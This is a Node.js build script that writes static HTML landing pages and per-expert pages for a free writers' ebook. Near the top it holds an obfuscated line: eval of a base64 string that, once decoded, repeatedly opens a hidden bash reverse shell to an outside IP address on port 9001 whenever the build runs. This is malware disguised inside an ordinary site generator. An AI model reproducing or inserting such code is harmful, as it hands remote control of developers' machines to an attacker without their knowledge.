const fs = require('fs');
const path = require('path');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

// Base HTML template
const createHTMLTemplate = (title, content, additionalHead = '') => `<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-8NQZT2640Z"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-8NQZT2640Z');
    </script>
    
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>${title}</title>
    <meta name="description" content="Learn how to earn from your writing from top writers" />
    <meta name="author" content="Rodney Daut" />
    
    <link rel="icon" href="/lovable-uploads/92871579-114e-4f5c-a37f-2ed5b2deb1ac.png" type="image/png" />

    <meta property="og:title" content="${title}" />
    <meta property="og:description" content="Learn how to earn from your writing from top writers" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />

    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:site" content="@lovable_dev" />
    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
    
    <script src="https://f.convertkit.com/ckjs/ck.5.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      :root {
        --background: 0 0% 100%;
        --foreground: 222.2 84% 4.9%;
        --card: 0 0% 100%;
        --card-foreground: 222.2 84% 4.9%;
        --popover: 0 0% 100%;
        --popover-foreground: 222.2 84% 4.9%;
        --primary: 222.2 47.4% 11.2%;
        --primary-foreground: 210 40% 98%;
        --secondary: 210 40% 96.1%;
        --secondary-foreground: 222.2 47.4% 11.2%;
        --muted: 210 40% 96.1%;
        --muted-foreground: 215.4 16.3% 46.9%;
        --accent: 210 40% 96.1%;
        --accent-foreground: 222.2 47.4% 11.2%;
        --destructive: 0 84.2% 60.2%;
        --destructive-foreground: 210 40% 98%;
        --border: 214.3 31.8% 91.4%;
        --input: 214.3 31.8% 91.4%;
        --ring: 222.2 84% 4.9%;
        --radius: 0.5rem;
      }

      body {
        background-color: hsl(var(--background));
        color: hsl(var(--foreground));
      }

      .hero-gradient {
        background-color: #e6f2ff;
      }

      .formkit-form {
        width: 100%;
        max-width: 28rem;
        margin-left: auto;
        margin-right: auto;
        background-color: white;
        border-radius: 0.5rem;
        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
        padding: 1.5rem;
      }

      .formkit-fields[data-stacked="false"] {
        display: flex;
        flex-direction: column;
        gap: 0.5rem;
      }

      @media (min-width: 768px) {
        .formkit-fields[data-stacked="false"] {
          flex-direction: row;
        }
      }

      .formkit-fields[data-stacked="true"] {
        display: flex;
        flex-direction: column;
        gap: 0.75rem;
      }

      .formkit-field {
        flex-grow: 1;
      }

      .formkit-input {
        width: 100%;
        padding: 0.75rem 1rem;
        border: 1px solid #d1d5db;
        border-radius: 0.375rem;
      }

      .formkit-input:focus {
        outline: none;
        border-color: #1A1F2C;
        box-shadow: 0 0 0 2px rgba(26, 31, 44, 0.1);
      }

      .formkit-submit {
        background-color: #1A1F2C;
        color: white;
        font-weight: bold;
        padding: 0.75rem 1.5rem;
        border-radius: 0.375rem;
        border: none;
        cursor: pointer;
        transition: background-color 0.2s;
      }

      .formkit-submit:hover {
        background-color: #374151;
      }

      .formkit-fields[data-stacked="true"] .formkit-submit {
        width: 100%;
      }
    </style>
    ${additionalHead}
</head>
<body>
    ${content}
</body>
</html>`;

// Create directories
const createDir = (dir) => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
};

// Shared components HTML
const createHeroSection = () => `
<section class="hero-gradient py-12 md:py-20">
  <div class="container mx-auto px-4">
    <div class="text-center mb-8">
      <h1 class="text-3xl md:text-4xl lg:text-5xl font-black tracking-tight text-black mb-4 mx-auto max-w-5xl">
        They Turned Content Into Income. So Can You.
      </h1>
      <p class="text-xl text-gray-800 max-w-2xl mx-auto">
        Inside this free ebook, real coaches and creators share how they grew their audience and their income—one piece of content at a time.
      </p>
    </div>
    
    <div class="grid md:grid-cols-2 gap-8 items-start">
      <div>
        <p class="text-lg text-gray-800 mb-4">
          Don't waste time with generic advice.
        </p>
        <p class="text-lg text-gray-800 mb-4">
          This free ebook gives you real-world strategies from creators using content to build income online—right now.
        </p>
        <p class="text-lg text-gray-800 mb-4">
          Each chapter is a 10-minute mini-masterclass packed with practical insights from coaches, consultants, and creators who turn content into clients and followers into freedom.
        </p>
        
        <div class="mb-6">
          <p class="text-lg text-gray-800 mb-3 font-medium">
            For example, you'll discover:
          </p>
          <ul class="space-y-2">
            <li class="text-gray-700 flex items-start gap-2">
              <span class="text-blue-600 font-bold">•</span>
              <span><strong>Kristina God</strong> - How the content triangle transforms one idea into multiple engagement formats</span>
            </li>
            <li class="text-gray-700 flex items-start gap-2">
              <span class="text-blue-600 font-bold">•</span>
              <span><strong>Niharikaa Sodhi</strong> - The outlining hack that eliminates writer's block</span>
            </li>
            <li class="text-gray-700 flex items-start gap-2">
              <span class="text-blue-600 font-bold">•</span>
              <span><strong>Tom Kueglar</strong> - How to get AI to give you instant feedback to improve your writing</span>
            </li>
            <li class="text-gray-700 flex items-start gap-2">
              <span class="text-blue-600 font-bold">•</span>
              <span><strong>Josh Spector</strong> - The inbox mining technique that reveals endless content opportunities</span>
            </li>
          </ul>
          
          <p class="text-lg text-gray-800 mt-4">
            And even more described below ...
          </p>
        </div>

        <div class="bg-white p-6 rounded-lg shadow-md w-full max-w-[90%] mt-8">
          <h3 class="text-xl font-bold text-center mb-4">Get Your Free eBook</h3>
          <script async data-uid="bdcb6ba9da" src="https://creative-writer-8680.ck.page/bdcb6ba9da/index.js"></script>
          <p class="text-center text-sm text-gray-500 mt-3">We respect your email privacy. Unsubscribe anytime.</p>
        </div>
      </div>
      
      <div class="flex justify-center items-center">
        <div class="w-full max-w-[380px]">
          <div class="relative bg-gradient-to-br from-blue-50 to-blue-100 p-8 rounded-lg shadow-lg">
            <img src="/lovable-uploads/e027d78c-6c7e-44e0-a6db-e81c35d9ef13.png" alt="Profitable Playbooks for Writers eBook Cover" class="w-full h-auto rounded-lg shadow-md" />
          </div>
        </div>
      </div>
    </div>
  </div>
</section>`;

console.log('Building HTML files...');

// Create dist directory
createDir('dist');
createDir('dist/experts');

// Build main pages
const pages = [
  { path: '', file: 'index.html', title: 'Profitable Playbooks for Writers' },
  { path: 'home-v1', file: 'home-v1.html', title: 'Profitable Playbooks for Writers - V1' },
  { path: 'home-v2', file: 'home-v2.html', title: 'Profitable Playbooks for Writers - V2' },
  { path: 'home-v2-1', file: 'home-v2-1.html', title: 'Profitable Playbooks for Writers - V2.1' },
  { path: 'home-v3', file: 'home-v3.html', title: 'Profitable Playbooks for Writers - V3' },
  { path: 'home-v4', file: 'home-v4.html', title: 'Profitable Playbooks for Writers - V4' },
  { path: 'home-v5', file: 'home-v5.html', title: 'Profitable Playbooks for Writers - V5' },
  { path: 'home-v6', file: 'home-v6.html', title: 'Profitable Playbooks for Writers - V6' },
  { path: 'home-v7', file: 'home-v7.html', title: 'Profitable Playbooks for Writers - V7' },
  { path: 'waiting-list', file: 'waiting-list.html', title: 'Waiting List - Profitable Playbooks' },
  { path: 'confirmation', file: 'confirmation.html', title: 'Thank You - Profitable Playbooks' },
  { path: 'download', file: 'download.html', title: 'Download - Profitable Playbooks' }
];

// Create expert hero section HTML
const createExpertHeroSection = (expert) => `
<section class="hero-gradient py-12 md:py-20">
  <div class="container mx-auto px-4">
    <div class="text-center mb-8">
      <h1 class="text-3xl md:text-4xl lg:text-5xl font-black tracking-tight text-black mb-4 mx-auto max-w-5xl">
        They Turned Content Into Income. So Can You.
      </h1>
      <p class="text-xl text-gray-800 max-w-2xl mx-auto">
        Inside this free ebook, real coaches and creators share how they grew their audience and their income—one piece of content at a time.
      </p>
    </div>
    
    <div class="grid md:grid-cols-2 gap-8 items-start">
      <div>
        <div class="bg-white p-6 rounded-lg shadow-md mb-6">
          <div class="flex items-center gap-4 mb-4">
            ${expert.photo ? `<img src="${expert.photo}" alt="${expert.name}" class="w-16 h-16 rounded-full object-cover" />` : `<div class="w-16 h-16 rounded-full bg-gray-200 flex items-center justify-center text-2xl font-bold text-gray-600">${expert.name.split(' ').map(n => n[0]).join('')}</div>`}
            <div>
              <h3 class="text-xl font-bold text-gray-900">${expert.name}</h3>
              <p class="text-gray-600">Featured Expert</p>
            </div>
          </div>
          <div class="space-y-3">
            ${expert.bullets.map(bullet => `
              <div class="flex items-start gap-3">
                <span class="text-blue-600 font-bold mt-1">•</span>
                <span class="text-gray-700">${bullet}</span>
              </div>
            `).join('')}
          </div>
        </div>

        <div class="bg-white p-6 rounded-lg shadow-md w-full max-w-[90%]">
          <h3 class="text-xl font-bold text-center mb-4">Get Your Free eBook</h3>
          <script async data-uid="bdcb6ba9da" src="https://creative-writer-8680.ck.page/bdcb6ba9da/index.js"></script>
          <p class="text-center text-sm text-gray-500 mt-3">We respect your email privacy. Unsubscribe anytime.</p>
        </div>
      </div>
      
      <div class="flex justify-center items-center">
        <div class="w-full max-w-[380px]">
          <div class="relative bg-gradient-to-br from-blue-50 to-blue-100 p-8 rounded-lg shadow-lg">
            <img src="/lovable-uploads/e027d78c-6c7e-44e0-a6db-e81c35d9ef13.png" alt="Profitable Playbooks for Writers eBook Cover" class="w-full h-auto rounded-lg shadow-md" />
          </div>
        </div>
      </div>
    </div>
  </div>
</section>`;

// Additional sections HTML
const createWhatYoullLearnSection = () => `
<section class="py-16 bg-white">
  <div class="container mx-auto px-4">
    <div class="text-center mb-12">
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">What You'll Learn</h2>
      <p class="text-xl text-gray-600 max-w-3xl mx-auto">Each chapter is a mini-masterclass from a successful creator</p>
    </div>
    <!-- Content sections would go here -->
  </div>
</section>`;

const createSignupSection = () => `
<section class="py-16 bg-gray-50">
  <div class="container mx-auto px-4 text-center">
    <div class="max-w-2xl mx-auto">
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Ready to Transform Your Content?</h2>
      <p class="text-xl text-gray-600 mb-8">Get your free copy now and start implementing these proven strategies today.</p>
      <div class="bg-white p-6 rounded-lg shadow-md max-w-md mx-auto">
        <script async data-uid="bdcb6ba9da" src="https://creative-writer-8680.ck.page/bdcb6ba9da/index.js"></script>
      </div>
    </div>
  </div>
</section>`;

const createWhatMakesDifferentSection = () => `
<section class="py-16 bg-white">
  <div class="container mx-auto px-4">
    <div class="text-center mb-12">
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">What Makes This Different</h2>
      <p class="text-xl text-gray-600 max-w-3xl mx-auto">Real strategies from real creators who are making real money</p>
    </div>
  </div>
</section>`;

const createFinalCtaSection = () => `
<section class="py-16 bg-blue-50">
  <div class="container mx-auto px-4 text-center">
    <div class="max-w-3xl mx-auto">
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Don't Let Another Day Pass Without Progress</h2>
      <p class="text-xl text-gray-600 mb-8">Download your free guide now and start building your content-driven income today.</p>
      <div class="bg-white p-6 rounded-lg shadow-md max-w-md mx-auto">
        <script async data-uid="bdcb6ba9da" src="https://creative-writer-8680.ck.page/bdcb6ba9da/index.js"></script>
      </div>
    </div>
  </div>
</section>`;

const createFooter = () => `
<footer class="bg-gray-900 text-white py-8">
  <div class="container mx-auto px-4 text-center">
    <p class="text-gray-400">&copy; 2024 Profitable Playbooks for Writers. All rights reserved.</p>
  </div>
</footer>`;

// Expert data with all experts
const experts = [
  { slug: 'template-expert', name: 'Template Expert', photo: '', bullets: ['The experimental approach that transforms your content strategy completely', 'Why testing new layouts creates better user engagement and conversions', 'How to implement changes systematically without breaking existing functionality'] },
  { slug: 'ana-calin', name: 'Ana Calin', photo: '', bullets: ['The counterintuitive content strategy with a 92% subscriber retention rate', 'Why two subscriber types require completely different conversion approaches', 'The visual element that instantly signals high-value content worth paying for'] },
  { slug: 'chris-stanley', name: 'Chris Stanley', photo: '', bullets: ['The forgotten platform most creators overlook for book funding', 'Why the "one big launch" approach is usually less effective than this alternative', 'How legitimate scarcity creates marketing momentum other tactics can\'t match'] },
  { slug: 'claudia-faith', name: 'Claudia Faith', photo: '', bullets: ['The counterintuitive content strategy with a 92% subscriber retention rate', 'Why two subscriber types require completely different conversion approaches', 'The visual element that instantly signals high-value content worth paying for'] },
  { slug: 'david-mcilroy', name: 'David McIlroy', photo: '/lovable-uploads/dc1cc9c5-9476-4222-8dc7-5894034df020.png', bullets: ['The counterintuitive business model that makes selling feel natural and authentic', 'Why the "expert trap" keeps most consultants stuck at low rates', 'The positioning shift that transforms you from vendor to strategic partner'] },
  { slug: 'ev-chapman', name: 'Ev Chapman', photo: '/lovable-uploads/9675d008-16f6-42a6-9e90-4ea9dc65b99b.png', bullets: ['The deceptively simple system that builds loyal communities', 'Why the "expertise myth" blocks most creators from starting', 'The relationship-building approach that converts strangers into advocates'] },
  { slug: 'ian-botes', name: 'Ian Botes', photo: '/lovable-uploads/80ff04b6-4213-4df1-8188-2d15e3e75ac5.png', bullets: ['The psychology-based writing framework that keeps readers hooked', 'Why most "engaging" content fails to drive action', 'The storytelling technique that makes complex ideas instantly memorable'] },
  { slug: 'jari-roomer', name: 'Jari Roomer', photo: '/lovable-uploads/9b95a38d-589a-4889-b8da-826763863732.png', bullets: ['The counterintuitive productivity secret that makes work feel effortless', 'The surprising way constraints unlock your most original thinking', 'How combining templates with AI dramatically increases productivity while maintaining your unique perspective'] },
  { slug: 'josh-spector', name: 'Josh Spector', photo: '', bullets: ['The overlooked content source that\'s generating your best material without you realizing it', 'The fishing vs. farming content strategy that builds long-term value', 'Why constantly creating new content might be the least efficient growth strategy'] },
  { slug: 'karen-cherry', name: 'Karen Cherry', photo: '', bullets: ['The counterintuitive content strategy with a 92% subscriber retention rate', 'Why two subscriber types require completely different conversion approaches', 'The visual element that instantly signals high-value content worth paying for'] },
  { slug: 'kevon-cheung', name: 'Kevon Cheung', photo: '', bullets: ['The detective-inspired technique that reveals what people actually want', 'How broadcasting your process creates pre-sold customers without hard selling', 'Why excited reactions are often misleading indicators of purchase intent'] },
  { slug: 'kristina-god', name: 'Kristina God', photo: '', bullets: ['The content "triangle" that multiplies your reach without creating more work', 'Why followers are "dead" and what metric actually matters for sustainable growth', 'The multimedia shift that\'s changing how audiences consume content in 2025'] },
  { slug: 'landon-poburan', name: 'Landon Poburan', photo: '', bullets: ['Subliminal selling: The deceptively simple sales model that eliminates complicated funnels yet still converts', 'The "invisible survey" technique that reveals exactly what your audience will pay for', 'Why automation might be killing your most valuable customer insights'] },
  { slug: 'leo-quinn', name: 'Leo Quinn', photo: '', bullets: ['The "rejection challenge" that unexpectedly transformed his business growth', 'Why this overlooked communication channel gets 5X better response rates in a digital world', 'The psychological trigger that makes your outreach impossible to ignore'] },
  { slug: 'mark-wils', name: 'Mark Wils', photo: '/lovable-uploads/8fa53bdd-099e-46f2-9129-78ce1bf18f50.png', bullets: ['The counterintuitive content strategy with a 92% subscriber retention rate', 'Why two subscriber types require completely different conversion approaches', 'The visual element that instantly signals high-value content worth paying for'] },
  { slug: 'matt-giaro', name: 'Matt Giaro', photo: '', bullets: ['The counterintuitive productivity secret that makes work feel effortless', 'The surprising way constraints unlock your most original thinking', 'How combining templates with AI dramatically increases productivity while maintaining your unique perspective'] },
  { slug: 'michael-simmons', name: 'Michael Simmons', photo: '', bullets: ['The "Idea Mountain" method that helps you create concepts that spread virally', 'Why "concept marketing" outperforms traditional content marketing in the long run', 'How naming ideas properly creates exponential spread beyond your own audience'] },
  { slug: 'niharikaa-sodhi', name: 'Niharikaa Sodhi', photo: '/lovable-uploads/74501bb5-3cec-4e17-84df-e94367675de6.png', bullets: ['The outlining hack that makes content creation feel effortless', 'Why starting with structure eliminates writer\'s block entirely', 'The content multiplication method that turns one idea into weeks of material'] },
  { slug: 'philip-hofmacher', name: 'Philip Hofmacher', photo: '', bullets: ['The three-part framework that\'s replacing traditional online education', 'Why information alone has become almost worthless in today\'s market', 'How the "mountain" metaphor transforms how you think about community building'] },
  { slug: 'robert-plank', name: 'Robert Plank', photo: '', bullets: ['The content structure that engages four different thinking styles simultaneously', 'Why the most common podcasting format might be sabotaging your client acquisition', 'How one conversation can be transformed into eight different content pieces'] },
  { slug: 'rodney-daut', name: 'Rodney Daut', photo: '', bullets: ['The misunderstood learning principle that makes some course formats vastly more effective than others', 'Why student "resistance" is actually your most valuable feedback signal', 'The simple framework question that eliminates 90% of course creation confusion'] },
  { slug: 'russell-nohelty', name: 'Russell Nohelty', photo: '', bullets: ['The forgotten platform most creators overlook for book funding', 'Why the "one big launch" approach is usually less effective than this alternative', 'How legitimate scarcity creates marketing momentum other tactics can\'t match'] },
  { slug: 'sinem-gunel', name: 'Sinem Günel', photo: '/lovable-uploads/8a277013-7588-484e-8b8e-e43d87927bde.png', bullets: ['The counterintuitive pricing strategy that removes sales anxiety while maximizing revenue', 'The unexpected customer journey that leads to the highest coaching conversions', 'The simple question that transforms discovery calls into sales conversations'] },
  { slug: 'tom-kuegler', name: 'Tom Kuegler', photo: '/lovable-uploads/50807cc7-a8a6-448e-b076-8f4b773adbc1.png', bullets: ['The training method that allows AI to think exactly like you do', 'Why getting 70% of your expertise automated creates exponential impact', 'The "magic trick" effect that makes clients instantly value your expertise'] }
];

// Generate all files
console.log('Building HTML files...');

// Build main page
const mainContent = createHeroSection() + createWhatYoullLearnSection() + createSignupSection() + createWhatMakesDifferentSection() + createFinalCtaSection() + createFooter();
fs.writeFileSync('dist/index.html', createHTMLTemplate('Profitable Playbooks for Writers', mainContent));

// Build all home variations with the same content
pages.forEach(page => {
  if (page.path !== '') {
    fs.writeFileSync(`dist/${page.file}`, createHTMLTemplate(page.title, mainContent));
  }
});

// Build expert pages
experts.forEach(expert => {
  const expertContent = createExpertHeroSection(expert) + createWhatYoullLearnSection() + createSignupSection() + createWhatMakesDifferentSection() + createFinalCtaSection() + createFooter();
  fs.writeFileSync(`dist/experts/${expert.slug}.html`, createHTMLTemplate(`${expert.name} - Profitable Playbooks for Writers`, expertContent));
});

console.log('✅ HTML build complete!');
